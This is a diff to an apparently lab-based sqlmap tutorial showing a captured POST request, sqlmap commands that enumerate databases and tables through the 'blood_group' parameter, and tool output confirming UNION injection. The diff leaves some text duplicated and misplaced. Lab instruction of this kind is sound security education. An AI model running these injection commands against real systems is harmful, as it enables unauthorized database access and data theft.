@@ -179,7 +179,13 @@ Options:
 ### Enumeration commands
 
 
-These options can be used to enumerate the back-end database management system information, structure, and data contained in tables.
+
+Here we have used two flags: -u to state the vulnerable URL and --dbs to enumerate the database.
+
+  
+Simple HTTP POST Based Test
+
+First, we need to identify the vulnerable POST request and save it. In order to save the request, Right Click on the request, select 'Copy to file', and save it to a directory. You could also copy the whole request and save it to a text file as well.
 
 
 You’ll notice in the request above, we have a POST parameter 'blood_group' which could a vulnerable parameter.
@@ -194,7 +200,8 @@ Content-Length: 16
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 Origin: http://10.10.17.116
-Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Referer: http://10.10.17.116/blood/nl-search.php
 Accept-Encoding: gzip, deflate
@@ -212,7 +219,6 @@ Now that we’ve identified a potentially vulnerable parameter, let’s jump int
 sqlmap -r req.txt -p blood_group --dbs
 
 **sqlmap -r <request_file> -p <vulnerable_parameter> --dbs**
-
 Here we have used two flags: -r to read the file, -p to supply the vulnerable parameter, and --dbs to enumerate the database.
 
 Database Enumeration
@@ -226,7 +232,8 @@ for the remaining tests, do you want to include all tests for 'MySQL' extending 
 [19:33:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
 [19:33:09] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
 [19:33:09] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
-[19:33:09] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')[19:33:10] [WARNING] reflective value(s) found and filtering out
+[19:33:09] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')
+[19:33:10] [WARNING] reflective value(s) found and filtering out
 [19:33:12] [INFO] target URL appears to be UNION injectable with 8 columns
 [19:33:13] [INFO] POST parameter 'blood_group' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
 POST parameter 'blood_group' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
@@ -252,61 +259,6 @@ available databases [6]:
 [*] mysql
 [*] performance_schema
 [*] sys
-[*] test
-
-
-  
-Now that we have the databases, let's extract tables from the database blood.
-
-Using GET based Method  
-  
-sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables
-
-sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables  
-**  
-**Using POST based Method
-
-sqlmap -r req.txt -p blood_group -D blood --tables
-
-sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables  
-**
-
-Once we run these commands, we should get the tables.
-
-I hope you have enjoyed seeing the basics of using sqlmap and its various commands. Now, let’s start the challenge in the next task!
-
-You’ll notice in the request above, we have a POST parameter 'blood_group' which could a vulnerable parameter.
-
-SavedHTTPPOST request
-
-```shell-session
-nare@nare$ cat req.txt
-POST /blood/nl-search.php HTTP/1.1
-Host: 10.10.17.116
-Content-Length: 16
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://10.10.17.116
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://10.10.17.116/blood/nl-search.php
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Cookie: PHPSESSID=bt0q6qk024tmac6m4jkbh8l1h4
-Connection: close
-
-blood_group=B%2B
-```
-
-  
-  
-Now that we’ve identified a potentially vulnerable parameter, let’s jump into the sqlmap and use the following command:  
-  
-`sqlmap -r req.txt -p blood_group --dbs`
-
-`**sqlmap -r <request_file> -p <vulnerable_parameter> --dbs**`
-
 Here we have used two flags: -r to read the file, -p to supply the vulnerable parameter, and --dbs to enumerate the database.
 
 Database Enumeration
